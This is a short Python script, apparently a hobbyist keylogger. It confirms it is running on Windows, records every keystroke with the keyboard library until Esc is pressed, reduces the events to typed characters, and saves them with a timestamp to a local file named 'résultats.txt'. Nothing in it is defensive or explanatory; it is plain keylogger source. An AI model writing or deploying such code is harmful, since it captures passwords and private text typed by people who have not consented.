import datetime
import keyboard
import os.path
i=0
b=0
path = 'C:\Windows\System32'
isdir = os.path.isdir(path)
if isdir == True :
    rwrite = []
    recorded = keyboard.record(until='esc')
    long = int((len(recorded)-1)/2)
    while long > i :
        del recorded[i]
        i = i +1

    del recorded[long]

    while long > b :
        mot = str(recorded[b])
        if len(mot) == 19:
            rwrite.append(mot[14])
            b=b+1
        else :
            rwrite.append(mot)
            b=b+1
    date = str((datetime.datetime.today()))
    rwrite = str(rwrite)

    total = str(rwrite + " " + date)
    with open("résultats.txt", "w") as f :
        f.write(total)